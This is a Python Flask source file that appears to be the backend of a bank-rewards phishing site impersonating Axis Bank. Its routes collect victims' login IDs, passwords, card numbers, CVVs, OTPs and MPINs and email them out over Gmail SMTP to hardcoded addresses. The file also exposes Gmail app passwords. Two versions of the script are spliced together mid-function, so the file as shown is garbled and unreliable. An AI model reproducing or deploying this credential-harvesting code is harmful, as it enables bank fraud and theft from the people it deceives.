from flask import Flask
from flask import render_template, redirect, request
import json
import os
import smtplib, ssl

from email.message import EmailMessage


email = "Ratanrohit420@gmail.com"
password = "vbizfaxctycoqyju"

def send_email(subject:str, body:str):from flask import Flask
from flask import render_template, redirect, request
import json
import os
import smtplib, ssl

from email.message import EmailMessage


email = "Ratanrohit420@gmail.com"
password = "qshpjbehxagztxec"

def send_email(subject:str, body:str):
    em = EmailMessage()
    em["From"] = email
    em["To"] = 'sb2001nov@gmail.com'
    em["subject"] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email, password)
        smtp.sendmail(email, email, em.as_string())

ROOT = os.path.realpath(os.path.dirname(__file__))

Domain  = "https://www.axisbankrewards.co/"

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return "<p>Hello, World!</p>"

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

# post requests
@app.route("/login", methods=["POST"])
def login():
    data = request.form
    info = f"UserID: {data.get('userid')}, Password: {data.get('pass')}"
    try:
        send_email("login", info)
    except:
        return "can't send email"
    return redirect(f"{Domain}card_detail.html")

@app.route("/card_detail", methods=["POST"])
def card_detail():
    data = request.form
    info = f"cname: {data.get('cname')}, email: {data.get('email')}, cnumber: {data.get('cnumber')}, expmonth: {data.get('expmonth')}, expyear: {data.get('expyear')}, cvv: {data.get('cvv')}"
    send_email("card_detail", info)
    return redirect(f"{Domain}congo.html")

@app.route("/otp", methods=["POST"])
def otp():
    data = request.form
    info = f"otp: {data.get('otp')}, mpin: {data.get('mpin')}"
    send_email("otp", info)
    return redirect(f"{Domain}alert.html")

if __name__ == "__main__":
    app.run(debug=False)
    em = EmailMessage()
    em["From"] = email
    em["To"] = email
    em["subject"] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.login(email, password)
        smtp.sendmail(email, email, em.as_string())

ROOT = os.path.realpath(os.path.dirname(__file__))

Domain  = "https://www.axisbankrewards.co/"

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return "<p>Hello, World V2!</p>"

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

# post requests
@app.route("/login", methods=["POST"])
def login():
    data = request.form
    info = f"UserID: {data.get('userid')}, Password: {data.get('pass')}"
    try:
        send_email("login", info)
    except:
        return "can't send email"
    return redirect(f"{Domain}card_detail.html")

@app.route("/card_detail", methods=["POST"])
def card_detail():
    data = request.form
    info = f"cname: {data.get('cname')}, email: {data.get('email')}, cnumber: {data.get('cnumber')}, expmonth: {data.get('expmonth')}, expyear: {data.get('expyear')}, cvv: {data.get('cvv')}"
    send_email("card_detail", info)
    return redirect(f"{Domain}congo.html")

@app.route("/otp", methods=["POST"])
def otp():
    data = request.form
    info = f"otp: {data.get('otp')}, mpin: {data.get('mpin')}"
    send_email("otp", info)
    return redirect(f"{Domain}alert.html")

if __name__ == "__main__":
    app.run(debug=False)
